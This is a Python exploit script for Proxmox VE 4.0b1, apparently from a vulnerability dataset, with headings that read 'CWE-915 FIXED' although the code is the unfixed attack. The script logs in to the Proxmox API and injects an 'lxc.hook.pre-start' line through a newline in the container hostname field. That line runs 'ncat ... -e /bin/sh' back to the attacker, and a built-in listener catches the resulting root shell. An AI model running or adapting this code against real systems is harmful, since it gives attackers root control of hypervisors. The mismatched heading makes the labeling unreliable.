# CWE-915
CWE-915 FIXED

# CODE
```python
#!/usr/bin/env python

import requests
import socket
import telnetlib
from threading import Thread
import argparse
from time import sleep


def exploit(target, username, password, vmid, template, realm, reverse, hostname):
        payload = "ncat %s %s -e /bin/sh" % reverse

        print "[~] Obtaining authorization key..."
        apireq = requests.post("https://%s/api2/extjs/access/ticket" %
        target,
        verify=False,
        data={"username": username,
        "password": password,
        "realm": realm})

        response = apireq.json()
        if "success" in response and response["success"]:
            print "[+] Authentication success."
            ticket = response["data"]["ticket"]
            csrfticket = response["data"]["CSRFPreventionToken"]
            createvm = requests.post("https://%s/api2/extjs/nodes/%s/lxc" % (target, hostname),
                verify=False,
                headers={"CSRFPreventionToken":
                csrfticket},
                cookies={"PVEAuthCookie": ticket},
                data={"vmid": vmid, "hostname": "sysdream\nlxc.hook.pre-start=%s &&" % payload,
                        "storage": "local",
                        "password": "sysdream",
                        "ostemplate": template,
                        "memory": 512,
                        "swap": 512,
                        "disk": 2,
                        "cpulimit": 1,
                        "cpuunits": 1024,
                        "net0": "name=eth0"})
            if createvm.status_code == 200:
                response = createvm.json()
                if "success" in response and response["success"]:
                    print "[+] Container Created... (Sleeping 20 seconds)"
                    sleep(20)
                    print "[+] Starting container..."
                    startcontainer = requests.post("https://%s/api2/extjs/nodes/%s/lxc/%s/status/start" % (target, hostname, vmid), verify=False, headers={"CSRFPreventionToken": csrfticket}, cookies={"PVEAuthCookie": ticket})
                    if startcontainer.status_code == 200:
                        response = startcontainer.json()
                        if "success" in response and response["success"]:
                            print "[+] Exploit should be working..."
                        else:
                            print "[!] Can't start container ! Try to start it manually."
                else:
                    print "[!] Error creating container..."
                    print response
            else:
                print "[!] Error creating Container. Bad HTTP Status code : %d" % createvm.status_code
        else:
            print "[!] Authentication failed - Check the credentials..."

def handler(lport):
        print "[~] Starting handler on port %d" % lport
        t = telnetlib.Telnet()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", lport))
        s.listen(1)
        conn, addr = s.accept()

        print "[+] Connection from %s" % addr[0]

        t.sock = conn

        print "[+] Pop the shell ! :)"

        t.interact()

if __name__ == "__main__":
        print "[~] Proxmox VE 4.0b1 Authenticated Root Exploit - Nicolas Chatelain <n.chatelain[at]sysdream.com>\n"

        parser = argparse.ArgumentParser()
        parser.add_argument("--target", required=True, help="The target host (eg : 10.0.0.1:8006)")

        parser.add_argument("--username", required=True)
        parser.add_argument("--password", required=True)

        parser.add_argument("--localhost", required=True, help="Local host IP for the connect-back shell.")
        parser.add_argument("--localport", required=True, type=int, help="Local port for local bind handler")

        parser.add_argument("--vmid", required=False, default="999", type=int, help="A unique ID for the container, exploit will fail if the ID already exists.")

        parser.add_argument("--template", required=False,
default="local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz", help="An existing template in the hypervisor " "(default : local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz)")

        parser.add_argument("--realm", required=False, default="pam",choices=["pve", "pam"])

        parser.add_argument("--hostname", required=True, help="The target hostname")

        args = parser.parse_args()

        handlerthr = Thread(target=handler, args=(args.localport,))
        handlerthr.start()

        exploitthr = Thread(target=exploit, args=(args.target,args.username, args.password, args.vmid, args.template, args.realm,
(args.localhost, args.localport), args.hostname))
        exploitthr.start()

        handlerthr.join()
        ```
